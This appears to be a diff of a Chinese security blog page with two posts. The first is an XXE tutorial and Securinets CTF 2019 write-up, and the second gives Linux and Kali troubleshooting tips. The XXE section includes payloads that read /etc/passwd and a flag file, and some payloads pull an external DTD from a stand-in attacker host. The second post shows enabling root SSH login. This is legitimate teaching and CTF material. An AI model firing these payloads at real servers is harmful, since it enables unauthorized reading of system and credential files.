+      <a href="/2019/03/25/vulnerable/xxe/" rel="bookmark">
+        <time class="entry-date published" datetime="2019-03-25T10:48:18.530Z">
+          2019-03-25
+        </time>
+      </a>
+    </span>
+  </div>
+
+
+  
+
+  <div class="article-content">
+    <div class="entry">
+      
+        <h1 id="xxe"><a href="#xxe" class="headerlink" title="xxe"></a>xxe</h1><h2 id="xml基础"><a href="#xml基础" class="headerlink" title="xml基础"></a>xml基础</h2><p>什么是 XML?</p>
+<blockquote>
+<p>XML 指可扩展标记语言（EXtensible Markup Language）<br>XML 是一种标记语言，很类似 HTML<br>XML 的设计宗旨是传输数据，而非显示数据<br>XML 标签没有被预定义。您需要自行定义标签。<br>XML 被设计为具有自我描述性。<br>XML 是 W3C 的推荐标准</p>
+</blockquote>
+<p>结构</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;
+&lt;!DOCTYPE note [
+      &lt;!ELEMENT note (to,from,heading,body)&gt;
+    &lt;!ELEMENT to  (#PCDATA)&gt;
+    &lt;!ELEMENT from(#PCDATA)&gt;
+      &lt;!ELEMENT heading (#PCDATA)&gt;
+      &lt;!ELEMENT body(#PCDATA)&gt;
+    ]&gt;
+&lt;note&gt;
+&lt;to&gt;George&lt;/to&gt;
+&lt;from&gt;John&lt;/from&gt;
+&lt;heading&gt;Reminder&lt;/heading&gt;
+&lt;body&gt;Don&apos;t forget the meeting!&lt;/body&gt;
+&lt;/note&gt;
+</code></pre><p>所以主要有以下模块</p>
+<ul>
+<li><p>元素<br>元素是 XML 以及 HTML 文档的主要构建模块，元素可包含文本、其他元素或者是空的。<br>上例的<code>&lt;note&gt;</code>元素为根元素，进行概括性描述，而<code>&lt;to&gt;、&lt;from&gt;</code>等为子元素，详细描述</p>
+</li>
+<li><p>属性<br>元素可以附加某些属性<br>如<code>&lt;img src=&quot;computer.gif&quot; /&gt;</code></p>
+</li>
+<li><p>实体<br>实体是用来定义普通文本的变量。实体引用是对实体的引用。</p>
+</li>
+<li><p>PCDATA<br>PCDATA 的意思是被解析的字符数据（parsed character data）。<br>PCDATA 是会被解析器解析的文本。这些文本将被解析器检查实体以及标记。</p>
+</li>
+<li><p>CDATA<br>CDATA 的意思是字符数据（character data）。<br>CDATA 是不会被解析器解析的文本。</p>
+</li>
+</ul>
+<h2 id="DTD-文档类型定义"><a href="#DTD-文档类型定义" class="headerlink" title="DTD(文档类型定义)"></a>DTD(文档类型定义)</h2><p>DTD（文档类型定义）的作用是定义 XML 文档的合法构建模块。</p>
+<p>DTD 可以在 XML 文档内声明，也可以外部引用。</p>
+<p>1.内部声明：&lt;!DOCTYPE 根元素 [元素声明]&gt; ex: <code>&lt;!DOCTYOE test any&gt;</code></p>
+<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE note [
+  &lt;!ELEMENT note (to,from,heading,body)&gt;
+  &lt;!ELEMENT to  (#PCDATA)&gt;
+  &lt;!ELEMENT from(#PCDATA)&gt;
+  &lt;!ELEMENT heading (#PCDATA)&gt;
+  &lt;!ELEMENT body(#PCDATA)&gt;
+]&gt;
+&lt;note&gt;
+  &lt;to&gt;George&lt;/to&gt;
+  &lt;from&gt;John&lt;/from&gt;
+  &lt;heading&gt;Reminder&lt;/heading&gt;
+  &lt;body&gt;Don&apos;t forget the meeting!&lt;/body&gt;
+&lt;/note&gt;
+</code></pre><p>2.外部声明（引用外部DTD）：&lt;!DOCTYPE 根元素 SYSTEM “文件名”&gt; ex:<code>&lt;!DOCTYPE test SYSTEM &#39;http://www.test.com/evil.dtd&#39;&gt;</code></p>
+<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE note SYSTEM &quot;note.dtd&quot;&gt;
+&lt;note&gt;
+&lt;to&gt;George&lt;/to&gt;
+&lt;from&gt;John&lt;/from&gt;
+&lt;heading&gt;Reminder&lt;/heading&gt;
+&lt;body&gt;Don&apos;t forget the meeting!&lt;/body&gt;
+&lt;/note&gt; 
+</code></pre><p>note.dtd内容：</p>
+<pre><code>&lt;!ELEMENT note (to,from,heading,body)&gt;
+&lt;!ELEMENT to (#PCDATA)&gt;
+&lt;!ELEMENT from (#PCDATA)&gt;
+&lt;!ELEMENT heading (#PCDATA)&gt;
+&lt;!ELEMENT body (#PCDATA)&gt;
+</code></pre><blockquote>
+<p>DTD（文档类型定义）的作用是定义 XML 文档的合法构建模块。<br>它使用一系列的合法元素来定义文档结构。</p>
+</blockquote>
+<h3 id="DTD实体"><a href="#DTD实体" class="headerlink" title="DTD实体"></a>DTD实体</h3><p>DTD实体是用于定义引用普通文本或特殊字符的快捷方式的变量，可以内部声明或外部引用。</p>
+<p><strong>实体又分为一般实体和参数实体<br>1.一般实体的声明语法:&lt;!ENTITY 实体名 “实体内容“&gt;<br>引用实体的方式：&amp;实体名；<br>2.参数实体只能在DTD中使用，参数实体的声明格式： &lt;!ENTITY % 实体名 “实体内容“&gt;<br>引用实体的方式：%实体名；</strong></p>
+<p>1，内部实体声明:&lt;!ENTITY 实体名称 “实体的值”&gt; ex:&lt;!ENTITY eviltest “eviltest”&gt;<br>完整实例:</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE test [
+&lt;!ENTITY writer &quot;Bill Gates&quot;&gt;
+&lt;!ENTITY copyright &quot;Copyright W3School.com.cn&quot;&gt;
+]&gt;
+
+&lt;test&gt;&amp;writer;&amp;copyright;&lt;/test&gt;
+</code></pre><p>2，外部实体声明:&lt;!ENTITY 实体名称 SYSTEM “URI”&gt;<br>完整实例:</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE test [
+&lt;!ENTITY writer SYSTEM &quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;&gt;
+&lt;!ENTITY copyright SYSTEM &quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;&gt;
+]&gt;
+&lt;author&gt;&amp;writer;&amp;copyright;&lt;/author&gt;
+</code></pre><h2 id="xxe（XML-External-Entity）攻击"><a href="#xxe（XML-External-Entity）攻击" class="headerlink" title="xxe（XML External Entity）攻击"></a>xxe（XML External Entity）攻击</h2><h3 id="注入方式"><a href="#注入方式" class="headerlink" title="注入方式"></a>注入方式</h3><h4 id="方式一：直接通过DTD外部实体声明"><a href="#方式一：直接通过DTD外部实体声明" class="headerlink" title="方式一：直接通过DTD外部实体声明"></a>方式一：直接通过DTD外部实体声明</h4><pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE a [
+    &lt;!ENTITY b SYSTEM &quot;file:///etc/passwd&quot;&gt;
+]&gt;
+&lt;c&gt;&amp;b;&lt;/c&gt;
+</code></pre><h4 id="方式二：通过DTD文档引入外部DTD文档，再引入外部实体声明"><a href="#方式二：通过DTD文档引入外部DTD文档，再引入外部实体声明" class="headerlink" title="方式二：通过DTD文档引入外部DTD文档，再引入外部实体声明"></a>方式二：通过DTD文档引入外部DTD文档，再引入外部实体声明</h4><p>xml内容：</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE a SYSTEM &quot;http://xxx.com/evil.dtd&quot;&gt;
+&lt;c&gt;&amp;b;&lt;/c&gt;
+</code></pre><p>dtd文件内容：</p>
+<pre><code>&lt;!ENTITY b SYSTEM &quot;file:///etc/passwd&quot;&gt;
+</code></pre><h4 id="方式三：通过DTD外部实体声明引入外部实体声明"><a href="#方式三：通过DTD外部实体声明引入外部实体声明" class="headerlink" title="方式三：通过DTD外部实体声明引入外部实体声明"></a>方式三：通过DTD外部实体声明引入外部实体声明</h4><pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE a [
+    &lt;!ENTITY % d SYSTEM &quot;http://xxx.com/evil.dtd&quot;&gt;
+        %d;
+]&gt;
+&lt;c&gt;&amp;b;&lt;/c&gt;
+</code></pre><p>dtd文件内容：</p>
+<pre><code>&lt;!ENTITY b SYSTEM &quot;file:///etc/passwd&quot;&gt;
+</code></pre><h3 id="支持协议类型"><a href="#支持协议类型" class="headerlink" title="支持协议类型"></a>支持协议类型</h3><p><img src="https://images2017.cnblogs.com/blog/1205477/201707/1205477-20170729141612957-759004042.png" alt=""></p>
+<p>其中php支持的协议会更多一些，但需要一定的扩展支持。</p>
+<p><img src="https://images2017.cnblogs.com/blog/1205477/201707/1205477-20170729141643972-251925223.png" alt=""></p>
+<h3 id="危害性"><a href="#危害性" class="headerlink" title="危害性"></a>危害性</h3><h4 id="XXE危害1：读取任意文件"><a href="#XXE危害1：读取任意文件" class="headerlink" title="XXE危害1：读取任意文件"></a>XXE危害1：读取任意文件</h4><h4 id="XXE危害2：执行系统命令"><a href="#XXE危害2：执行系统命令" class="headerlink" title="XXE危害2：执行系统命令"></a>XXE危害2：执行系统命令</h4><h4 id="XXE危害3：探测内网端口"><a href="#XXE危害3：探测内网端口" class="headerlink" title="XXE危害3：探测内网端口"></a>XXE危害3：探测内网端口</h4><h4 id="XXE危害4：攻击内网网站"><a href="#XXE危害4：攻击内网网站" class="headerlink" title="XXE危害4：攻击内网网站"></a>XXE危害4：攻击内网网站</h4><h2 id="Securinets-CTF-Quals-2019-feedback"><a href="#Securinets-CTF-Quals-2019-feedback" class="headerlink" title="Securinets CTF Quals 2019-feedback"></a>Securinets CTF Quals 2019-feedback</h2><ul>
+<li><strong>link</strong>：<a href="www.ctfsecurinets.com">www.ctfsecurinets.com</a></li>
+</ul>
+<p>界面是一个类似留言板的东西，查看源代码，发现：</p>
+<pre><code>&lt;script type=&quot;text/javascript&quot;&gt;
+function func(){
+var xml = &apos;&apos; +
+&apos;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&apos; +
+&apos;&lt;feedback&gt;&apos; +
+&apos;&lt;author&gt;&apos; + $(&apos;input[name=&quot;name&quot;]&apos;).val() + &apos;&lt;/author&gt;&apos; +
+&apos;&lt;email&gt;&apos; + $(&apos;input[name=&quot;email&quot;]&apos;).val() + &apos;&lt;/email&gt;&apos; +
+&apos;&lt;content&gt;&apos; + $(&apos;input[name=&quot;feedback&quot;]&apos;).val() + &apos;&lt;/content&gt;&apos; +
+&apos;&lt;/feedback&gt;&apos;;
+var xmlhttp = new XMLHttpRequest();
+xmlhttp.onreadystatechange = function () {
+if(xmlhttp.readyState == 4){
+console.log(xmlhttp.readyState);
+console.log(xmlhttp.responseText);
+document.getElementById(&apos;Message&apos;).innerHTML = xmlhttp.responseText;
+}
+}
+xmlhttp.open(&quot;POST&quot;,&quot;feed.php&quot;,true);
+xmlhttp.send(xml);
+};
+&lt;/script&gt;
+</code></pre><p>然后查看request和response：<br><strong>request</strong></p>
+<p>payload:</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;feedback&gt;&lt;author&gt;d&lt;/author&gt;&lt;email&gt;d@d.d&lt;/email&gt;&lt;content&gt;undefined&lt;/content&gt;&lt;/feedback&gt;
+</code></pre><p><strong>response</strong></p>
+<pre><code>&lt;h4&gt;Thanks For you Feedback d&lt;/h4&gt;
+</code></pre><p>于是可以尝试构造</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;!DOCTYPE A [&lt;!ENTITY d SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;
+&lt;feedback&gt;
+  &lt;author&gt;&amp;d;&lt;/author&gt;
+  &lt;email&gt;wdd&lt;/email&gt;
+  &lt;content&gt;undefined&lt;/content&gt;
+&lt;/feedback&gt;
+</code></pre><p><img src="https://i.imgur.com/fKbqRLG.png" alt=""></p>
+<p>然后再改payload为</p>
+<pre><code>&lt;!DOCTYPE A [&lt;!ENTITY d SYSTEM &quot;file:///proc/self/cwd/flag&quot;&gt;]&gt;
+</code></pre><p>reference：<br><a href="http://www.w3school.com.cn/dtd/dtd_elements.asp" target="_blank" rel="noopener">http://www.w3school.com.cn/dtd/dtd_elements.asp</a><br><a href="https://www.cnblogs.com/r00tuser/p/7255939.html" target="_blank" rel="noopener">https://www.cnblogs.com/r00tuser/p/7255939.html</a><br><a href="http://www.w3school.com.cn/xml/index.asp" target="_blank" rel="noopener">http://www.w3school.com.cn/xml/index.asp</a></p>
+
+      
+    </div>
+
+  </div>
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+
+    
+
+    
+    
+
+    <span class="post-tags">
+      <i class="icon-tags"></i>
+        <a href="/tags/xxe/">xxe</a>
+    </span>
+    
+
+    </div>
+
+    
+  </div>
+</article>
+
+
+
+  <article>
+
+  
+    
+    <h3 class="article-title"><a href="/2019/03/18/OS/linux常见问题/"><span>Linux常见错误</span></a></h3>
+    
+  
+
+  <div class="article-top-meta">
+    <span class="posted-on">
+      <a href="/2019/03/18/OS/linux常见问题/" rel="bookmark">
+        <time class="entry-date published" datetime="2019-03-18T09:48:55.253Z">
+          2019-03-18
+        </time>
+      </a>
+    </span>
+  </div>
+
+
+  
+
+  <div class="article-content">
+    <div class="entry">
+      
+        <h1 id="ubuntu常见错误"><a href="#ubuntu常见错误" class="headerlink" title="ubuntu常见错误"></a>ubuntu常见错误</h1><h2 id="Package-has-no-installation-candidate"><a href="#Package-has-no-installation-candidate" class="headerlink" title="Package has no installation candidate"></a>Package has no installation candidate</h2><p>解决：</p>
+<pre><code># apt-get update
 # apt-get upgrade
 # apt-get install &lt;packagename&gt;
-E: Could not get lock /var/lib/dp...</p></div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2019-03-18</span><i class="fa fa-tag"></i><a class="tag" href="/tags/linux/" title="linux">linux </a></div></div></div></div><div class="pagination"><ul class="clearfix"><li class="pre pagbuttons"><a class="btn" role="navigation" href="/page/3/">上一页</a></li><li class="next pagbuttons"><a class="btn" role="navigation" href="/page/5/">下一页</a></li></ul></div></div></div></div><script src="/js/jquery.js"></script><script src="/js/jquery-migrate-1.2.1.min.js"></script><script src="/js/jquery.appear.js"></script></body></html>
+</code></pre><h2 id="E-Could-not-get-lock-var-lib-dpkg-lock-open-11-Resource-temporarily-unavailable"><a href="#E-Could-not-get-lock-var-lib-dpkg-lock-open-11-Resource-temporarily-unavailable" class="headerlink" title="E: Could not get lock /var/lib/dpkg/lock - open (11: Resource temporarily unavailable)"></a>E: Could not get lock /var/lib/dpkg/lock - open (11: Resource temporarily unavailable)</h2><p>E: Unable to lock the administration directory (/var/lib/dpkg/), is another process using it? ##</p>
+<p>方法一：</p>
+<pre><code>ps afx|grep apt
+</code></pre><p>查找apt的进程并将其kill</p>
+<p>方法二：<br>由于 锁定的文件会阻止 Linux 系统中某些文件或者数据的访问，这个概念也存在于 Windows 或者其他的操作系统中。一旦你运行了 apt-get 或者 apt 命令，锁定文件将会创建于 /var/lib/apt/lists/、/var/lib/dpkg/、/var/cache</p>
+<pre><code>rm /var/lib/dpkg/lock
+dpkg --configure -a
+apt update
+</code></pre><h2 id="Linux下is-not-in-the-sudoers-file解决方法"><a href="#Linux下is-not-in-the-sudoers-file解决方法" class="headerlink" title="Linux下is not in the sudoers file解决方法"></a>Linux下is not in the sudoers file解决方法</h2><p>　  1、切换到root用户或者有root权限的用户，运行<code>vim /etc/sudoers</code>命令<br>　  2、找到root ALL=(ALL) ALL，在下面添加一行 xxx ALL=(ALL) ALL 其中xxx是要加入的用户名称</p>
+<h2 id="netstat无法显示PID或进程名"><a href="#netstat无法显示PID或进程名" class="headerlink" title="netstat无法显示PID或进程名"></a>netstat无法显示PID或进程名</h2><p>用root用户执行，即sudo</p>
+<h2 id="在Ubuntu上禁用IPv6"><a href="#在Ubuntu上禁用IPv6" class="headerlink" title="在Ubuntu上禁用IPv6"></a>在Ubuntu上禁用IPv6</h2><p>1.禁用 IPv6 - 方案1<br>编辑文件 <code>/etc/sysctl.conf</code></p>
+<pre><code>$ sudo gedit /etc/sysctl.conf
+</code></pre><p>在文件的最后加入下面的行。</p>
+<pre><code># IPv6 disabled
+net.ipv6.conf.all.disable_ipv6 =1
+net.ipv6.conf.default.disable_ipv6 =1
+net.ipv6.conf.lo.disable_ipv6 =1
+</code></pre><p>保存并关闭</p>
+<p>重启sysctl</p>
+<pre><code>$ sudo sysctl -p
+</code></pre><p>再次检查ifconfig的输出，这里应该没有IPv6地址了。</p>
+<pre><code>$ ifconfig
+</code></pre><p>如果不行，尝试重启系统并再次检查ifconfig</p>
+<p>2.禁用 IPv6 - GRUB 方案<br>IPv6同样可以通过编辑grub配置文件禁用。</p>
+<pre><code>$ sudo gedit /etc/default/grub
+</code></pre><p>查找包含”GRUBCMDLINELINUX”的行，并如下编辑：</p>
+<pre><code>GRUB_CMDLINE_LINUX=&quot;ipv6.disable=1&quot;
+</code></pre><p>同样可以加入名为”GRUBCMDLINELINUX_DEFAULT”的变量，这同样有用。保存并关闭文件，重新生成grub配置。</p>
+<pre><code>$ sudo update-grub2
+</code></pre><p>重启，现在IPv6应该就已经禁用了。</p>
+<h2 id="Linux下网卡重启"><a href="#Linux下网卡重启" class="headerlink" title="Linux下网卡重启"></a>Linux下网卡重启</h2><blockquote>
+<p>/etc/init.d/network restart 或者是  /etc/init.d/networking restart</p>
+</blockquote>
+<h2 id="Linux如何查看端口状态"><a href="#Linux如何查看端口状态" class="headerlink" title="Linux如何查看端口状态"></a>Linux如何查看端口状态</h2><p>netstat命令各个参数说明如下：</p>
+<blockquote>
+<p>　　-t : 指明显示TCP端口</p>
+<p>　　-u : 指明显示UDP端口</p>
+<p>　　-l : 仅显示监听套接字(所谓套接字就是使应用程序能够读写与收发通讯协议(protocol)与资料的程序)</p>
+<p>　　-p : 显示进程标识符和程序名称，每一个套接字/端口都属于一个程序。</p>
+<p>　　-n : 不进行DNS轮询，显示IP(可以加速操作)</p>
+</blockquote>
+<p>即可显示当前服务器上所有端口及进程服务，于grep结合可查看某个具体端口及服务情况··</p>
+<p><code>netstat -ntlp</code>   //查看当前所有tcp端口·</p>
+<p><code>netstat -ntulp |grep 80</code>   //查看所有80端口使用情况·</p>
+<p><code>netstat -an | grep 3306</code>  //查看所有3306端口使用情况·</p>
+<p>查看一台服务器上面哪些服务及端口</p>
+<pre><code>netstat  -lanp
+</code></pre><p>查看一个服务有几个端口。比如要查看mysqld</p>
+<pre><code>ps -ef |grep mysqld
+</code></pre><p>查看某一端口的连接数量,比如3306端口</p>
+<pre><code>netstat -pnt |grep :3306 |wc
+</code></pre><p>查看某一端口的连接客户端IP 比如3306端口</p>
+<pre><code>netstat -anp |grep 3306
+</code></pre><p><code>netstat -an</code> 查看网络端口 </p>
+<p><code>lsof -i :port</code>，使用lsof -i :port就能看见所指定端口运行的程序，同时还有当前连接。 </p>
+<h1 id="kali常见问题"><a href="#kali常见问题" class="headerlink" title="kali常见问题"></a>kali常见问题</h1><h2 id="网卡问题"><a href="#网卡问题" class="headerlink" title="网卡问题"></a>网卡问题</h2><p>重启网络服务：</p>
+<pre><code># /etc/init.d/networking restart
+</code></pre><p>无法联网的<a href="https://blog.csdn.net/like98k/article/details/79873320" target="_blank" rel="noopener">解决方案</a></p>
+<h2 id="root账号无法登录SSH问题-Permission-denied-please-try-again"><a href="#root账号无法登录SSH问题-Permission-denied-please-try-again" class="headerlink" title="root账号无法登录SSH问题-Permission denied, please try again."></a>root账号无法登录SSH问题-Permission denied, please try again.</h2><p>我们编辑sshd_config文件，我们输入：vim /etc/ssh/sshd_config<br>找到<code># Authentication</code>这行，添加：</p>
+<blockquote>
+<p>PermitRootLogin yes</p>
+</blockquote>
+
+      
+    </div>
+
+  </div>
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+
+    
+
+    
+    
+
+    <span class="post-tags">
+      <i class="icon-tags"></i>
+        <a href="/tags/linux/">linux</a>
+    </span>
+    
+
+    </div>
+
+    
+  </div>
+</article>
+
+
+
+
+<nav class="pagination">
+  
+  <a href="/page/3/" class="pagination-prev">上一页</a>
+  
+  
+  <a href="/page/5/" class="pagination-next">下一页</a>
+  
+</nav>
+    </main>
+
+    <footer class="site-footer">
+  <p class="site-info">
+    Proudly powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and
+    Theme by <a href="https://github.com/CodeDaraW/Hacker" target="_blank">Hacker</a>
+    </br>
+    
+    &copy; 2019 damn1t
+    
+  </p>
+</footer>
+    
+  </div>
+</div>
+</body>
+</html>
